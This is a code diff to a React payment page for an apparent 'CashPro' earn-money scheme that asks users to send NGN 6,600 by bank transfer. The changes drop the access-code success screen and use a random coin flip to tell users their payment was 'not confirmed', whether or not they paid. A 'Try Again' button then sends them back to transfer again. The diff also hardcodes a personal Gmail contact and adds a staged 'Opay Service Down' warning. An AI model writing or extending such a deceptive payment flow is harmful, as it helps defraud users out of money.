@@ -7,7 +7,7 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
-import { CheckCircle, Clock } from "lucide-react"
+import { CheckCircle, Clock, Eye } from "lucide-react"
 
 interface UserData {
   fullName: string
@@ -21,7 +21,7 @@ interface PaymentFlowProps {
   onComplete: () => void
 }
 
-type PaymentStep = "details" | "transfer" | "confirmation" | "success"
+type PaymentStep = "details" | "transfer" | "confirmation" | "payment-not-confirmed"
 
 export function PaymentFlow({ userData, onComplete }: PaymentFlowProps) {
   const [currentStep, setCurrentStep] = useState<PaymentStep>("details")
@@ -43,16 +43,19 @@ export function PaymentFlow({ userData, onComplete }: PaymentFlowProps) {
 
     // Simulate payment processing
     await new Promise((resolve) => setTimeout(resolve, 3000))
-    setCurrentStep("success")
+    const paymentConfirmed = Math.random() > 0.5 // Simulate payment confirmation
+    if (paymentConfirmed) {
+      setIsProcessing(false)
+      onComplete()
+      return
+    } else {
+      setCurrentStep("payment-not-confirmed")
+    }
     setIsProcessing(false)
   }
 
   const handleCopyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text)
-  }
-
-  const handleBackToVerification = () => {
-    onComplete()
   }
 
   if (currentStep === "details") {
@@ -152,6 +155,34 @@ export function PaymentFlow({ userData, onComplete }: PaymentFlowProps) {
               <p className="text-lg">Proceed to your bank app to complete this Transfer</p>
             </div>
 
+            <div className="bg-white rounded-lg p-4 border border-gray-200 space-y-4">
+              {/* OPay Logo */}
+              <div className="flex justify-center">
+                <div className="w-16 h-16 bg-green-600 rounded-lg flex items-center justify-center">
+                  <span className="text-white font-bold text-lg">OPay</span>
+                </div>
+              </div>
+
+              {/* Service Down Heading */}
+              <h3 className="text-xl font-bold text-red-600 text-center">Opay Service Down</h3>
+
+              {/* Main Message */}
+              <p className="text-center text-gray-700 font-medium">
+                Please do not use Opay bank for payments at this time.
+              </p>
+
+              {/* Warning Box */}
+              <div className="bg-red-50 border border-red-200 rounded-lg p-4">
+                <p className="text-red-700 text-center">
+                  The Opay bank service is currently experiencing issues. Please use other supported banks for your
+                  payment.
+                </p>
+              </div>
+
+              {/* I Understand Button */}
+              <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3">I Understand</Button>
+            </div>
+
             <div className="bg-gray-50 rounded-lg p-4 space-y-4">
               <div className="flex justify-between items-center">
                 <span className="font-medium">Amount</span>
@@ -224,12 +255,10 @@ export function PaymentFlow({ userData, onComplete }: PaymentFlowProps) {
                 <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center">
                   <span className="text-white font-bold">MP</span>
                 </div>
-                <div>
-                  <div className="text-right">
-                    <div className="text-2xl font-bold">NGN 6,600</div>
-                    <div className="text-sm text-muted-foreground">{userData.email}</div>
-                  </div>
-                </div>
+              </div>
+              <div className="text-right">
+                <div className="text-2xl font-bold">NGN 6,600</div>
+                <div className="text-sm text-muted-foreground">sundaychinemerem66@gmail.com</div>
               </div>
             </div>
 
@@ -254,35 +283,73 @@ export function PaymentFlow({ userData, onComplete }: PaymentFlowProps) {
     )
   }
 
-  if (currentStep === "success") {
+  if (currentStep === "payment-not-confirmed") {
     return (
-      <div className="min-h-screen flex items-center justify-center p-4">
-        <Card className="w-full max-w-md shadow-2xl border-0 bg-card/90 backdrop-blur-sm">
-          <CardContent className="p-8 text-center space-y-6">
-            <div className="mx-auto w-20 h-20 bg-green-500 rounded-full flex items-center justify-center">
-              <CheckCircle className="w-10 h-10 text-white" />
+      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-100">
+        <Card className="w-full max-w-md shadow-2xl border-0">
+          <CardHeader className="bg-gray-200 flex flex-row items-center justify-between p-4">
+            <h2 className="text-lg font-semibold">Bank Transfer</h2>
+            <Button variant="ghost" className="text-red-500 font-medium">
+              Cancel
+            </Button>
+          </CardHeader>
+
+          <CardContent className="p-6 space-y-6">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-3">
+                <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center">
+                  <span className="text-white font-bold">MP</span>
+                </div>
+              </div>
+              <div className="text-right">
+                <div className="text-2xl font-bold">NGN 6,600</div>
+                <div className="text-sm text-muted-foreground">sundaychinemerem66@gmail.com</div>
+              </div>
             </div>
 
-            <div className="space-y-4">
-              <h2 className="text-2xl font-bold text-foreground">Payment Confirmed!</h2>
-              <p className="text-muted-foreground">Your access code has been generated</p>
+            <div className="text-center py-4">
+              <p className="text-lg">Proceed to your bank app to complete this Transfer</p>
+            </div>
 
-              <div className="bg-gradient-to-r from-accent to-primary p-6 rounded-lg">
-                <p className="text-accent-foreground font-medium mb-2">Your Access Code:</p>
-                <div className="text-4xl font-bold text-accent-foreground font-mono tracking-widest">22334</div>
+            <div className="flex flex-col items-center space-y-6">
+              <div className="w-40 h-40 bg-red-500 rounded-full flex items-center justify-center shadow-lg">
+                <svg className="w-20 h-20 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={4} d="M6 18L18 6M6 6l12 12" />
+                </svg>
               </div>
 
-              <p className="text-sm text-muted-foreground">
-                Use this code to access your CashPro dashboard and start earning!
-              </p>
-            </div>
+              <h3 className="text-2xl font-bold text-orange-500 text-center tracking-wide">PAYMENT NOT CONFIRMED!</h3>
 
-            <Button
-              onClick={handleBackToVerification}
-              className="w-full bg-gradient-to-r from-accent to-primary hover:from-accent/90 hover:to-primary/90 text-accent-foreground font-medium py-3"
-            >
-              Continue to Login
-            </Button>
+              <p className="text-center text-gray-700 text-base px-4">
+                Your payment wasn't confirmed. contact us on email for help
+              </p>
+
+              <div className="w-full relative">
+                <Input
+                  type="password"
+                  value="•••••••••••••••••"
+                  className="w-full h-14 text-center text-xl tracking-[0.5em] bg-white border-2 border-gray-300 rounded-lg pr-12"
+                  readOnly
+                />
+                <Eye className="absolute right-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-500" />
+              </div>
+
+              <div className="w-full space-y-3 pt-4">
+                <Button
+                  onClick={() => setCurrentStep("transfer")}
+                  className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-medium text-lg"
+                >
+                  Try Again
+                </Button>
+                <Button
+                  onClick={onComplete}
+                  variant="outline"
+                  className="w-full h-12 border-2 border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-lg bg-transparent"
+                >
+                  Return to Home
+                </Button>
+              </div>
+            </div>
           </CardContent>
         </Card>
       </div>
